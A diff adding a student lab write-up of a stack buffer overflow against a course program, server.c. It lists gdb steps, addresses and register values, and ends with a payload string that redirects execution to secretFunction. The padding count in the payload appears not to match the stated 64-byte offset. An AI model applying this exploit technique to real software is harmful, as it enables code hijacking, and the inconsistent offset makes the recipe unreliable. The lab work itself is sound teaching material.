@@ -1,0 +1,33 @@
+Steps taken for attack:
+
+1) Compile server.c with the -g and -fno-stack-protector flags
+2) Run gdb on server
+3) Get address of secretFunction using disas secretFunction
+4) Address of secretFunction: 0x0000000000000f3b, last 4 bytes: 00000f3b
+    On thinlinc: 0x0000000000400e18, last 4 bytes 00400e18
+5) Set breakpoint: break clientComm
+    Set breakpoint at clientComm because that is the function that has the issue that can be exploited.
+    str was only allocated 5 bytes of data so using strcpy with that variable opens the door for this attack
+6) Use disas clientComm to find the address of the leaveq function
+    0x0000000000000f39
+    0x0000000000400e16
+7) Followed the steps on page 45 of Lecture 21. Results are in order as appear in lecture
+    $1 = 0xffffdea0
+    $2 = 0x7fffffffde40
+    $3 = 0xffffdea0
+    $4 = 0x400cd9
+    $5 = 0x7fffffffde00
+    
+8) After overflowing buffer
+    $6 = 0x7fffffffde00
+    $7 = 0xffffdea0
+    $8 = 0x7fffffffde40
+    $9 = 0xffffdea0
+    $10 = 0x400cd9
+	
+9) The difference between the base address and the stack pointer address is how many As you need.
+	This is because the base pointer will be the entry address and the stack pointer is the return
+	so you want to overflow all of that and then have the new address be at the end to overwrite the old return address
+	In my case, it is the difference between 0x7fffffffde40 and 0x7fffffffde00 which is 40 in hex and 64 in decimal
+	
+10) String is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x0e\x40\x00
